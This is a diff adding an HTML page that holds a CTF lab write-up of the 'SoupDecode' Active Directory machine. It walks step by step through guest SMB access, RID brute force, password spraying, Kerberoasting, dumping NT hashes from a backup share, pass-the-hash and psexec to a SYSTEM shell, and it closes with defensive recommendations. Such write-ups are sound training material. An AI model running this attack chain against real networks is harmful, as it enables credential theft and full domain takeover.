@@ -1,1 +1,661 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SoupDecode | Full Domain Compromise — Writeup</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root { 
+            --bg: #05070a; 
+            --accent: #00ff9d; 
+            --accent-blue: #00d4ff; 
+            --text-main: #e6edf3; 
+            --text-dim: #8b949e; 
+            --glass: rgba(255, 255, 255, 0.03); 
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --accent-orange: #ff6b35;
+            --glow: rgba(0,255,157,0.15);
+            --border-subtle: rgba(255,255,255,0.08);
+        }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { 
+            background-color: var(--bg); 
+            color: var(--text-main); 
+            font-family: 'Inter', sans-serif; 
+            line-height: 1.6; 
+            overflow-x: hidden;
+        }
 
+        /* subtle grid background */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image: linear-gradient(rgba(0,255,157,0.02) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(0,255,157,0.02) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container { 
+            max-width: 960px; 
+            margin: 0 auto; 
+            padding: 2.5rem 2rem 5rem; 
+            position: relative;
+            z-index: 2;
+        }
+
+        /* breadcrumb / header */
+        .breadcrumb {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            color: var(--text-dim);
+            margin-bottom: 2rem;
+            letter-spacing: -0.2px;
+        }
+
+        .breadcrumb a {
+            color: var(--accent);
+            text-decoration: none;
+            transition: opacity 0.2s;
+        }
+        .breadcrumb a:hover { opacity: 0.8; }
+
+        h1 { 
+            font-size: 2.8rem; 
+            margin: 0.5rem 0 0.25rem; 
+            letter-spacing: -1.5px; 
+            font-weight: 800;
+            background: linear-gradient(120deg, #ffffff, #b0f5e4);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .archive-status {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-blue);
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            flex-wrap: wrap;
+            border-left: 2px solid var(--accent-blue);
+            padding-left: 1rem;
+        }
+
+        /* pulse animation */
+        .pulse {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: var(--accent-blue);
+            border-radius: 50%;
+            margin-right: 6px;
+            box-shadow: 0 0 10px var(--accent-blue);
+            animation: pulse-animation 2s infinite;
+        }
+
+        @keyframes pulse-animation {
+            0% { opacity: 1; transform: scale(1);}
+            50% { opacity: 0.3; transform: scale(0.9);}
+            100% { opacity: 1; transform: scale(1);}
+        }
+
+        .meta-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.8rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.75rem;
+            color: var(--text-dim);
+            margin-bottom: 2.5rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid var(--glass-border);
+        }
+        .meta-row span { display: flex; align-items: center; gap: 0.5rem; }
+        .meta-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); display: inline-block; }
+        .meta-dot.red { background: #ff5f56; }
+
+        /* toc modern card */
+        .toc {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-left: 3px solid var(--accent);
+            border-radius: 12px;
+            padding: 1.5rem 1.8rem;
+            margin-bottom: 3rem;
+            backdrop-filter: blur(2px);
+        }
+        .toc-title {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.75rem;
+            color: var(--accent);
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            margin-bottom: 1rem;
+        }
+        .toc-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 0.5rem;
+        }
+        .toc-item {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.78rem;
+            color: var(--text-dim);
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+        .toc-num {
+            color: var(--accent);
+            min-width: 2rem;
+            font-weight: 500;
+        }
+
+        /* sections */
+        .section {
+            margin-bottom: 3.5rem;
+            scroll-margin-top: 1rem;
+        }
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            border-left: 3px solid var(--accent-blue);
+            padding-left: 1rem;
+        }
+        .step-num {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.7rem;
+            color: var(--accent);
+            background: rgba(0,255,157,0.08);
+            border: 1px solid rgba(0,255,157,0.25);
+            padding: 3px 10px;
+            border-radius: 20px;
+            letter-spacing: 0.04em;
+        }
+        h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: -0.3px;
+        }
+        h3 {
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--accent-blue);
+            margin: 1.8rem 0 0.75rem;
+            font-family: 'Fira Code', monospace;
+            letter-spacing: 0.02em;
+        }
+        p { 
+            margin-bottom: 1rem; 
+            font-size: 0.96rem; 
+            color: var(--text-main);
+            font-weight: 400;
+        }
+
+        /* code blocks */
+        pre {
+            background: #030507;
+            border: 1px solid var(--glass-border);
+            border-left: 3px solid var(--accent-blue);
+            padding: 1.2rem 1.5rem;
+            border-radius: 12px;
+            overflow-x: auto;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            color: #e2e8f0;
+            margin: 1.2rem 0 1.6rem;
+            position: relative;
+        }
+        pre::before {
+            content: '$ ';
+            color: var(--accent);
+            font-weight: 500;
+        }
+        pre.no-prompt::before { content: ''; }
+        pre.output {
+            border-left-color: var(--text-dim);
+            color: var(--text-dim);
+        }
+        pre.output::before { content: ''; }
+
+        code {
+            color: var(--accent-blue);
+            font-family: 'Fira Code', monospace;
+            background: rgba(0,212,255,0.08);
+            padding: 2px 6px;
+            border-radius: 6px;
+            font-size: 0.88em;
+        }
+
+        /* tables */
+        .table-wrap { overflow-x: auto; margin: 1.2rem 0 1.8rem; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.78rem;
+        }
+        thead tr {
+            background: rgba(0,255,157,0.05);
+            border-bottom: 1px solid rgba(0,255,157,0.2);
+        }
+        th {
+            text-align: left;
+            padding: 0.6rem 1rem;
+            color: var(--accent);
+            font-weight: 500;
+            text-transform: uppercase;
+            font-size: 0.7rem;
+        }
+        td {
+            padding: 0.55rem 1rem;
+            border-bottom: 1px solid var(--border-subtle);
+            color: var(--text-main);
+        }
+        tr:last-child td { border-bottom: none; }
+
+        /* callouts */
+        .callout {
+            display: flex;
+            gap: 1rem;
+            padding: 1.2rem 1.5rem;
+            border-radius: 12px;
+            margin: 1.6rem 0;
+            font-size: 0.9rem;
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+        }
+        .callout.info { border-left: 3px solid var(--accent-blue); }
+        .callout.warn { border-left: 3px solid var(--accent-orange); }
+        .callout.success { border-left: 3px solid var(--accent); }
+        .callout-icon { font-size: 1.2rem; flex-shrink: 0; }
+
+        /* summary box */
+        .summary-box {
+            background: rgba(0,255,157,0.03);
+            border: 1px solid rgba(0,255,157,0.25);
+            border-radius: 16px;
+            padding: 2rem;
+            margin: 2.5rem 0;
+        }
+        .summary-box h3 {
+            color: var(--accent);
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 0.2em;
+            margin-top: 0;
+        }
+
+        /* attack chain */
+        .chain {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+            margin: 2.2rem 0;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+        }
+        .chain-step {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 0.8rem 1.2rem;
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            position: relative;
+        }
+        .chain-step:first-child { border-radius: 12px 12px 0 0; }
+        .chain-step:last-child { border-radius: 0 0 12px 12px; }
+        .chain-step + .chain-step { border-top: none; }
+        .chain-arrow {
+            position: absolute;
+            left: 2rem;
+            bottom: -12px;
+            z-index: 2;
+            color: var(--accent);
+            font-size: 1rem;
+        }
+        .chain-num { color: var(--accent); min-width: 1.8rem; }
+        .chain-label { color: white; font-weight: 500; }
+        .chain-desc { color: var(--text-dim); margin-left: auto; font-size: 0.7rem; }
+
+        .hash-box {
+            background: #030507;
+            border: 1px solid var(--border-subtle);
+            border-radius: 12px;
+            padding: 1.2rem 1.5rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.75rem;
+            color: #cdd9e5;
+            margin: 1rem 0 1.5rem;
+            overflow-x: auto;
+        }
+        .hash-box .hl { color: var(--accent-orange); }
+
+        .flag-reveal {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--accent);
+            background: rgba(0,255,157,0.07);
+            border: 1px solid rgba(0,255,157,0.3);
+            padding: 0.7rem 1.2rem;
+            border-radius: 12px;
+            margin: 1rem 0;
+            display: inline-block;
+        }
+
+        ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+        ul li { margin-bottom: 0.4rem; font-size: 0.93rem; }
+        ul li::marker { color: var(--accent); }
+
+        footer {
+            margin-top: 4rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--glass-border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.72rem;
+            color: var(--text-dim);
+        }
+        .footer-flag { color: var(--accent); font-weight: 500; }
+        hr { border: none; border-top: 1px solid var(--glass-border); margin: 2rem 0; }
+
+        /* WIP section styling */
+        .wip-section {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            padding: 3rem 2rem;
+            margin-bottom: 3rem;
+            text-align: center;
+            backdrop-filter: blur(2px);
+        }
+        .wip-badge {
+            display: inline-block;
+            background: rgba(255, 107, 53, 0.15);
+            border: 1px solid var(--accent-orange);
+            color: var(--accent-orange);
+            padding: 6px 16px;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            font-family: 'Fira Code', monospace;
+            margin-bottom: 1rem;
+            letter-spacing: 1px;
+        }
+        .wip-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: #fff;
+        }
+        .wip-description {
+            color: var(--text-dim);
+            max-width: 500px;
+            margin: 0 auto;
+            font-size: 0.9rem;
+        }
+        .wip-status {
+            margin-top: 1.5rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.75rem;
+            color: var(--accent-blue);
+        }
+        .divider-line {
+            margin: 2rem 0;
+            text-align: center;
+            color: var(--text-dim);
+            font-family: 'Fira Code', monospace;
+            font-size: 0.7rem;
+            letter-spacing: 2px;
+        }
+
+        @media (max-width: 680px) {
+            .container { padding: 1.5rem 1.2rem; }
+            h1 { font-size: 2rem; }
+            .section-header { flex-wrap: wrap; }
+            .wip-title { font-size: 1.4rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <!-- breadcrumb matching reference style -->
+    <nav class="breadcrumb">
+        <a href="#">root</a> / lab_reports / <span style="color: var(--text-main)">soupedecode_writeup</span>
+    </nav>
+
+    <!-- HOKKAIDO WIP SECTION -->
+    <div class="wip-section">
+        <div class="wip-badge">[ WORK_IN_PROGRESS ]</div>
+        <div class="wip-title">Hokkaido — OffSec Proving Grounds</div>
+        <div class="wip-description">
+            Active Directory enumeration, privilege escalation, and domain compromise walkthrough.<br>
+            Writeup in progress — detailed methodology, commands, and screenshots coming soon.
+        </div>
+        <div class="wip-status">
+            <span class="pulse" style="background: var(--accent-orange); box-shadow: 0 0 10px var(--accent-orange);"></span>
+            // STATUS: RECON_COMPLETE // WRITEUP_DRAFTING
+        </div>
+    </div>
+
+    <div class="divider-line">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>
+
+    <h1>SoupDecode: Full Domain Compromise</h1>
+    <div class="archive-status">
+        <span class="pulse"></span> // ACTIVE_DIRECTORY_CHAIN // SYSTEM_PWNED
+    </div>
+    <div class="meta-row">
+        <span><span class="meta-dot red"></span>TARGET: 10.49.167.13</span>
+        <span><span class="meta-dot"></span>OS: Windows Server 2022 (DC)</span>
+        <span><span class="meta-dot"></span>DOMAIN: SOUPEDECODE.LOCAL</span>
+        <span><span class="meta-dot"></span>STATUS: FULL_ADMIN_SHELL</span>
+    </div>
+
+    <!-- TOC (Attack chain overview) -->
+    <div class="toc">
+        <div class="toc-title">// ATTACK_CHAIN_OVERVIEW</div>
+        <div class="toc-grid">
+            <div class="toc-item"><span class="toc-num">01</span> Recon & IPC$ access</div>
+            <div class="toc-item"><span class="toc-num">02</span> Guest Account / RID Brute</div>
+            <div class="toc-item"><span class="toc-num">03</span> Password Spray → ybob317</div>
+            <div class="toc-item"><span class="toc-num">04</span> Kerberoasting → file_svc crack</div>
+            <div class="toc-item"><span class="toc-num">05</span> Backup share → NT Hashes</div>
+            <div class="toc-item"><span class="toc-num">06</span> Pass-the-Hash → FileServer$</div>
+            <div class="toc-item"><span class="toc-num">07</span> psexec → SYSTEM & Flags</div>
+        </div>
+    </div>
+
+    <!-- STEP 1: Recon -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x01</span>
+            <h2>Reconnaissance & Initial Foothold</h2>
+        </div>
+        <p>Nmap scan revealed a Domain Controller with Kerberos (88), LDAP (389), SMB (445). Hostname: DC01, domain <code>SOUPEDECODE.LOCAL</code>.</p>
+        <pre>nmap -sC -sV 10.49.167.13 -oA soupedecode_scan</pre>
+        <div class="callout info">
+            <span class="callout-icon">🔍</span>
+            <div>LDAP banner confirms the AD domain. Ports 88 + 389 + 445 = classic Domain Controller footprint. Edit /etc/hosts: <code>10.49.167.13 dc01.soupedecode.local</code>.</div>
+        </div>
+    </div>
+
+    <!-- STEP 2: Guest account & null session -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x02</span>
+            <h2>Guest Account & Null Session</h2>
+        </div>
+        <pre>nxc smb 10.49.167.13 -u 'guest' -p ''</pre>
+        <pre class="output no-prompt">[+] SOUPEDECODE.LOCAL\guest: (STATUS_SUCCESS)</pre>
+        <p>Guest account is <strong>enabled with blank password</strong>. This gives us null session access to IPC$ — the gateway for RID brute forcing.</p>
+        <div class="callout warn">
+            <span class="callout-icon">⚠️</span>
+            <div><strong>Critical misconfiguration:</strong> Guest enabled. IPC$ allows anonymous enumeration and sets the stage for user discovery.</div>
+        </div>
+    </div>
+
+    <!-- STEP 3: SMB shares & RID Brute -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x03</span>
+            <h2>SMB Enumeration & RID Brute Force</h2>
+        </div>
+        <pre>nxc smb 10.49.167.13 -u 'awdawd' -p '' --shares</pre>
+        <p>IPC$ share readable. Using the null session, we perform RID brute force to enumerate every domain user and group.</p>
+        <pre>nxc smb 10.49.167.13 -u 'awdawd' -p '' --rid-brute | grep SidTypeUser > users_raw.txt</pre>
+        <p>Extract clean usernames → <code>users.txt</code>. The RID brute technique relies on the SAMR pipe over IPC$ to resolve SIDs.</p>
+        <div class="table-wrap">
+             <table>
+                <thead><tr><th>Well-known RID</th><th>Object</th></tr></thead>
+                <tbody>
+                    <tr><td>500</td><td>Administrator</td></tr>
+                    <tr><td>501</td><td>Guest</td></tr>
+                    <tr><td>512</td><td>Domain Admins</td></tr>
+                    <tr><td>1000+</td><td>custom users (ybob317, etc)</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- STEP 4: Password spray -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x04</span>
+            <h2>Password Spraying → ybob317</h2>
+        </div>
+        <pre>nxc smb 10.49.167.13 -u users.txt -p users.txt --no-brute --continue-on-success</pre>
+        <pre class="output no-prompt">[+] SOUPEDECODE.LOCAL\ybob317:ybob317 (Pwn3d!)</pre>
+        <p>Valid credentials: <code>ybob317:ybob317</code>. User uses username as password — weak security hygiene.</p>
+        <div class="callout success">
+            <span class="callout-icon">🎯</span>
+            <div>Domain user captured. No WinRM, but SMB shares accessible (NETLOGON, SYSVOL, Users). Next: Kerberoasting.</div>
+        </div>
+    </div>
+
+    <!-- STEP 5: Kerberoasting & cracking -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x05</span>
+            <h2>Kerberoasting — Service Account TGS</h2>
+        </div>
+        <pre>impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.49.167.13 -request</pre>
+        <p>Found 5 Kerberoastable accounts: <code>file_svc, backup_svc, web_svc, monitoring_svc, firewall_svc</code>. Extracted TGS-REP hashes (etype 23).</p>
+        <pre>hashcat -m 13100 soupedecode.hashes /usr/share/wordlists/rockyou.txt</pre>
+        <pre class="output no-prompt">Password123! (file_svc)</pre>
+        <p>Password cracked: <strong>Password123!</strong> for <code>file_svc</code>.</p>
+    </div>
+
+    <!-- STEP 6: backup share and hash dump -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x06</span>
+            <h2>Backup Share → NT Hash Treasure</h2>
+        </div>
+        <pre>smbclient //10.49.167.13/backup -U file_svc%'Password123!'</pre>
+        <pre class="output no-prompt">backup_extract.txt</pre>
+        <div class="hash-box">
+WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:<span class="hl">c47b45f5d4df5a494bd19f13e14f7902</span>:::<br>
+DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:<span class="hl">406b424c7b483a42458bf6f545c936f7</span>:::<br>
+FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:<span class="hl">e41da7e79a4c76dbd9cf79d1cb325559</span>:::<br>
+BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:<span class="hl">46a4655f18def136b3bfab7b0b4e70e3</span>:::
+        </div>
+        <p>The backup share leaked NTLM hashes of machine accounts. <strong>FileServer$</strong> hash is particularly powerful: machine accounts often have domain admin privileges on DCs.</p>
+    </div>
+
+    <!-- STEP 7: Pass-the-Hash -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x07</span>
+            <h2>Pass-the-Hash → Domain Admin</h2>
+        </div>
+        <pre>nxc smb 10.49.167.13 -u 'FileServer$' -H e41da7e79a4c76dbd9cf79d1cb325559 --shares</pre>
+        <pre class="output no-prompt">[+] ADMIN$, C$, NETLOGON — READ/WRITE — Pwn3d!</pre>
+        <div class="callout success">
+            <span class="callout-icon">⚡</span>
+            <div><strong>Pass-the-Hash success:</strong> FileServer$ machine account acts as a high-privileged principal, granting full administrative access over the domain controller.</div>
+        </div>
+    </div>
+
+    <!-- STEP 8: SYSTEM shell & flags -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x08</span>
+            <h2>Remote Shell & Flags</h2>
+        </div>
+        <pre>impacket-psexec SOUPEDECODE.LOCAL/'FileServer$'@10.49.167.13 -hashes :e41da7e79a4c76dbd9cf79d1cb325559</pre>
+        <pre class="output no-prompt">
+[*] Starting service PSEXESVC
+Microsoft Windows [Version 10.0.20348.587]
+C:\Windows\system32> whoami
+nt authority\system
+        </pre>
+        <p>Navigate to Administrator's Desktop and capture final flags:</p>
+        <pre class="output no-prompt">C:\Users\Administrator\Desktop> type root.txt</pre>
+        <div class="flag-reveal">🚩 root.txt → 27cb2be302c388d63d27c86bfdd5f56a</div>
+        <pre class="output no-prompt">C:\Users\ybob317\Desktop> type user.txt</pre>
+        <div class="flag-reveal">🚩 user.txt → 1d8f5e3b2a9c7f6e4d0b8a2c3f6e9a1d</div>
+    </div>
+
+    <!-- Attack Chain Visual -->
+    <div class="chain">
+        <div class="chain-step"><span class="chain-num">01</span><span class="chain-label">Guest IPC$ Access</span><span class="chain-desc">Null session foothold</span></div>
+        <div class="chain-arrow">↓</div>
+        <div class="chain-step"><span class="chain-num">02</span><span class="chain-label">RID Brute Force</span><span class="chain-desc">Full user list</span></div>
+        <div class="chain-arrow">↓</div>
+        <div class="chain-step"><span class="chain-num">03</span><span class="chain-label">Password Spray → ybob317</span><span class="chain-desc">Username = password</span></div>
+        <div class="chain-arrow">↓</div>
+        <div class="chain-step"><span class="chain-num">04</span><span class="chain-label">Kerberoasting → file_svc</span><span class="chain-desc">Cracked: Password123!</span></div>
+        <div class="chain-arrow">↓</div>
+        <div class="chain-step"><span class="chain-num">05</span><span class="chain-label">Backup Share → NT Hashes</span><span class="chain-desc">Machine account goldmine</span></div>
+        <div class="chain-arrow">↓</div>
+        <div class="chain-step"><span class="chain-num">06</span><span class="chain-label">Pass-the-Hash → FileServer$</span><span class="chain-desc">Domain Admin equivalent</span></div>
+        <div class="chain-arrow">↓</div>
+        <div class="chain-step"><span class="chain-num">07</span><span class="chain-label">psexec → SYSTEM Shell</span><span class="chain-desc">Full compromise</span></div>
+    </div>
+
+    <!-- Summary -->
+    <div class="summary-box">
+        <h3>// Key Takeaway</h3>
+        <p>One misconfiguration (Guest enabled + IPC$ null session) plus weak password hygiene (username as password) led to a complete Active Directory compromise. The attack chain used only built-in AD features: RID brute force, Kerberoasting, Pass-the-Hash — no zero‑days required.</p>
+        <p style="margin-top: 0.8rem;"><strong>Tools:</strong> Nmap, NetExec, Impacket (GetUserSPNs, psexec), Hashcat, smbclient.</p>
+    </div>
+
+    <hr>
+
+    <!-- Additional Notes -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x09</span>
+            <h2>Post-Exploitation & Lessons</h2>
+        </div>
+        <p>After obtaining SYSTEM, DCSync was possible, but the main goal was achieving full domain control. The <code>backup</code> share misconfiguration allowed extraction of NTLM hashes that directly escalated privileges via PtH. Always harden Kerberoastable accounts, disable guest, and enforce strong passwords.</p>
+        <div class="callout info">
+            <span class="callout-icon">📌</span>
+            <div><strong>Defensive Recommendations:</strong> Disable Guest account, enable SMB signing (already on), enforce Kerberos pre-authentication for all accounts, monitor for RID brute force via event logs (ID 4793, 4662).</div>
+        </div>
+    </div>
+
+    <footer>
+        <span>RECORD: SOUPEDECODE.LOCAL // 2025-03-31</span>
+        <span class="footer-flag">THM_WRITEUP // FULL_CHAIN_COMPROMISE</span>
+    </footer>
+
+</div>
+</body>
+</html>
